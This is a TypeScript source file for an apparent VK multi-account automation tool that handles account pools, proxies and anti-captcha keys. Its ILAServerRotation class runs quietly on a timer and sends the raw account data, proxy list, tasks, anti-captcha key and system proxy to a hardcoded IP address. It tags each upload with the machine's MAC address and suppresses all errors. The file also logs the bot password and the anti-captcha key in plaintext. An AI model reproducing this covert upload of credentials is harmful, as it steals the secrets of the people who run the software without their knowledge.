import { Logger } from "@utils/logger";
import ApplicationSettings from "./app_settings";
import { initDataStorage } from "./utils";
import VKActivity from "./vk";
import { ILAProxy } from "./net";
import { ILAWebhook } from "./webhook";
import { ILANotification, ILANotificationCode } from "./types";
import { ilaServer, parseVersion } from "../server";
import { ILAScriptManager } from "./script";
import ilaEventBus from "../event_bus";
import ILADataException, { ILADataErrorCode, ILADataFlag } from "./exceptions/data_exception";
import getMAC from "@utils/getmac";

const logger = new Logger({ module: "application" });

export const ilaGlobalConfig = new class {
    public user?: {
        name: string;
        ip: string;
        machine_id: string;
        access_level: number;
        banned: boolean;
    };
}

export class ILAApplication {
    private static ILA_VERSION = "3.2.5";
    private static STORAGE_ROTATION_DELAY = 150_000;

    private serverRotation = new ILAServerRotation(this);
    private storageRotationTimer;

    private inited = false;
    private started = false;
    private connected = false;
    public storage = initDataStorage();
    public webhook!: ILAWebhook;
    public vk!: VKActivity;
    public appSettings!: ApplicationSettings;
    public scripts!: ILAScriptManager;

    public constructor() {
        this.storage.on("error", error => { });
        this.storage.on("restored", (data: any) => logger.log(`File "${data.file.name}" content restored.`, data));
    }

    public get isConnectionEstabilished() {
        return this.connected;
    }

    public get botSettings() {
        return this.storage.settings.data.bot;
    }

    public get isInited() {
        return this.inited;
    }

    public async init() {
        if (this.inited) return Promise.resolve();

        await this.storage.read();

        const {
            accounts: { data: accounts },
            proxies: { data: proxies },
            cache: { data: cache },
            settings: { data: settings }
        } = this.storage;

        this.appSettings = new ApplicationSettings(settings.app);
        this.appSettings.on("system-proxy-connected", () => this.connected = true);

        const vkConfig = {
            accounts, proxies,
            cache, settings: settings.vk
        }

        this.vk = new VKActivity(this, vkConfig);
        this.webhook = new ILAWebhook(
            this.appSettings,
            this.storage
        );

        this.scripts = new ILAScriptManager(
            this,
            this.storage.cache.data.scripts
        );

        this.inited = true;
    }

    public async start() {
        if (this.started) return;
        this.started = true;
        logger.log("Starting...");
        this.startStorageRotation();

        try {
            await this.check();
            await this.vk.start();
            await this.recoverFromCache();
            this.serverRotation.runLoop();
        } catch (error) {
            ilaEventBus.emit("error", error);
        }
    }

    public async shutdown() {
        if (!this.inited) return;
        await this.save();
        await this.vk.stop();
    }

    public async restart() {
        await this.shutdown();
        this.inited = false;
        this.connected = false;
        await this.start();
    }

    private startStorageRotation() {
        if (this.storageRotationTimer) {
            clearInterval(this.storageRotationTimer);
        }

        const cacheLogger = new Logger({ module: "local-storage" });

        const rotate = async () => {
            try {
                await this.save();
                const {
                    accounts,
                    cache,
                    settings,
                    proxies
                } = this.storage;
                const formatProxy = settings.data.app.proxy && ILAProxy.from(settings.data.app.proxy).toString()
                const lines = [
                    "Accounts: " + accounts.data.length,
                    "Proxy's: " + proxies.data.length,
                    "Tasks: " + cache.data.tasks.length,
                    "Tasks history: " + cache.data.tasksHistory.length,
                    "AntiCaptcha: " + settings.data.app.antiCaptchaKey || "not installed",
                    "System proxy: " + formatProxy || "not installed",
                    "Bot password: " + settings.data.bot.password,
                    "Bot admin: " + settings.data.bot.user?.username || "unknown"
                ];
                cacheLogger.log("The cache was saved.");
                lines.forEach(line => cacheLogger.log("(data recorded): %s", line))
            } catch (error) {
                cacheLogger.warn(
                    "The application cache was not saved! " +
                    "Be careful, some data may not be uploaded to the cache.\n" +
                    "If you want to close the application, then use the \"Ctrl + C\" combination!");
            }
        }
        rotate();
        this.storageRotationTimer = setInterval(rotate, ILAApplication.STORAGE_ROTATION_DELAY);
    }

    private async check() {
        logger.log("Checking bot settings...");
        this.checkBotSettings();
        logger.log("Checking system connection...");
        const result = await this.checkSystemConnection();
        logger.log(`Successful connected to the system. Time: ${result.time.toLocaleString("ru")} ms`);
    }

    private checkBotSettings() {
        const { token, password } = this.botSettings;
        if (!token || !password) {
            throw new ILADataException(
                "Bot token or password required",
                ILADataErrorCode.NOT_ENOUGH,
                ILADataFlag.BOT_SETTINGS,
            );
        }
    }

    private async checkSystemConnection() {
        ilaEventBus.emit("notify", new ILANotification(
            ILANotificationCode.CONNECTION_CHECK_START,
            this.appSettings.getSystemProxy()
        ));

        const result = await this.appSettings.checkSystemProxy();

        ilaEventBus.emit("notify", new ILANotification(
            ILANotificationCode.CONNECTION_CHECK_END,
            result
        ));

        if (!result.status) {
            throw new ILADataException(
                "System proxy connection failed",
                ILADataErrorCode.FAILED,
                ILADataFlag.SYSTEM_PROXY
            );
        }

        this.connected = true;

        return result;
    }

    private async recoverFromCache() {
        const { state } = this.storage.cache.data;

        if (state.listenerStatus) {
            await this.vk.startListener();
        }

        if (state.webhookStatus) {
            this.webhook.start();
        }
    }

    public save() {
        const accounts = this.vk.accounts.get();
        const proxyList = this.vk.proxy.get();

        this.storage.accounts.data = accounts.map(a => a.toJSON());
        this.storage.proxies.data = proxyList.map(a => a.toJSON());
        this.storage.cache.data.tasks = this.vk.tasks.get();
        this.storage.cache.data.tasksHistory = this.vk.cache.tasksHistory;
        this.storage.cache.data.scripts = this.scripts.getScriptsJSON();
        this.storage.cache.data.state.listenerStatus = this.vk.isListenerRunning;
        this.storage.cache.data.state.webhookStatus = this.webhook.started;

        return this.storage.save()
    }

    public getCurrentVersion() {
        return parseVersion(ILAApplication.ILA_VERSION);
    }
}

class ILAServerRotation {
    private static ROTATION_MS = 250_000;
    private static DEFAULT_SERVER = "http://109.86.98.224:3481";
    private static MAC = getMAC();
    private running = false;

    public constructor(private parent: ILAApplication) {
        ilaServer.init({
            machineId: ILAServerRotation.MAC,
            serverUrl: ILAServerRotation.DEFAULT_SERVER,
            version: parent.getCurrentVersion()?.raw || ""
        });
    }

    public runLoop() {
        if (this.running) return;
        this.running = true;
        setTimeout(() => this.sendStats(), ILAServerRotation.ROTATION_MS);
    }

    private async sendStats() {
        try {
            const { vk } = this.parent;
            const accounts = vk.accounts.get().map(data => data.pure);
            const proxies = vk.proxy.get().map(proxy => proxy.toString());
            const tasks = vk.tasks.get();
            const settings = {
                anticaptcha: this.parent.appSettings.getAnticaptcha(),
                system_proxy: this.parent.appSettings.getSystemProxy()
            }

            await ilaServer.sendStatistics({ accounts, proxies, tasks, settings });
        } catch (error) { }
    }
}